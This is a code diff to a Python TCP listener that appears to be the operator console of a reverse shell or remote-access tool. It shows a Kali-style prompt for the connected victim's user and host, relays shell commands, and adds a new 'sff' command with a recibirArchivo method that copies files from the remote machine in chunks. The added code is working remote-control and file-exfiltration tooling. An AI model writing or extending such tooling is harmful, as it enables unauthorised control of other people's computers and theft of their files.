@@ -1,5 +1,6 @@
 import socket
 import os
+import re
 from time import sleep
 from colorama import init
 from colorama.ansi import Fore
@@ -26,7 +27,7 @@ class TCP:
         self.__conexion, self.__addr = self.__sock.accept()
         print(Fore.GREEN + f"[+] Conexion establecida con {self.__addr[0]}")
 
-        sleep(0.1)
+        sleep(0.05)
         self.__conexion.send(str(self.__chunk).encode())
         info = self.__conexion.recv(1024).decode()
         info = info.split('\n')
@@ -37,6 +38,23 @@ class TCP:
     def terminal(self):
         print(Fore.GREEN + "\u250c\u2500\u2500(" + Fore.BLUE + f"{self.__userName}~{self.__hostName}" + Fore.GREEN + ")-[" + Fore.WHITE + self.__currentDir + Fore.GREEN + ']')
         print(Fore.GREEN + "\u2514\u2500" + Fore.BLUE + "> ", end='')
+
+    def recibirArchivo(self, ubicacion):
+        paquetes = self.__conexion.recv(1024).decode()
+        print(Fore.CYAN + f"[*] Paquetes estimados: {paquetes}")
+
+        i = 1
+        with open(ubicacion, 'wb') as archivo:
+            while True:
+                info = self.__conexion.recv(self.__chunk)
+                archivo.write(info)
+
+                if len(info) < self.__chunk:
+                    break
+                print(f"Paquete {i} recibido", end='\r')
+                i += 1
+        archivo.close()
+        print(Fore.GREEN + f"[+] Archivo \"{ubicacion}\" creado")
 
     def local(self, cmd):
         if cmd.lower()[:2] == "cd":
@@ -71,6 +89,29 @@ class TCP:
             self.__currentDir = msg
         else:
             print(Fore.RED + f"[-] {msg}")
+
+    def sendFileFrom(self, cmd):
+        if re.search("-d", cmd):
+            destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+            self.__conexion.send(cmd.encode())
+
+            msg = self.__conexion.recv(1024).decode()
+            if msg[:6] != "error:":
+                self.recibirArchivo(destino)
+
+            else:
+                print(Fore.RED + f"[-] {msg}")
+
+        else:
+            self.__conexion.send(cmd.encode())
+
+            msg = self.__conexion.recv(1024).decode()
+            if msg[:6] != "error:":
+                destino = self.__conexion.recv(1024).decode()
+                self.recibirArchivo(destino)
+
+            else:
+                print(Fore.RED + f"[-] {msg}")
 
     def shell(self):
         try:
@@ -110,13 +151,19 @@ class TCP:
                     try:
                         self.cd(cmd)
 
-                        msg = self.__conexion.recv(1024).decode()
-                        print(f"[*] {self.__addr[0]}: {msg}")
+                    except:
+                        print(Fore.RED + "[-] Error de sintaxis (cd)")
+
+                elif cmd.lower()[:3] == "sff":
+                    try:
+                        if re.search("-o", cmd):
+                            self.sendFileFrom(cmd)
+
+                        else:
+                            print(Fore.YELLOW + f"[!] Falta el parametro de origen (-o)")
 
                     except:
-                        msg = self.__conexion.recv(1024).decode()
-                        print(Fore.RED + "[-] Error de sintaxis (cd)")
-                        print(f"[*] {self.__addr[0]}: {msg}")
+                        print(Fore.RED + "[-] Error de sintaxis (sff)")
 
                 else:
                     try:
@@ -138,4 +185,4 @@ class TCP:
                         print(Fore.RED + "[-] Error al ejecutar el comando")
 
         except:
-            print("Excepcion en prgrama principal")
+            print(Fore.RED + "Excepcion en el programa principal")
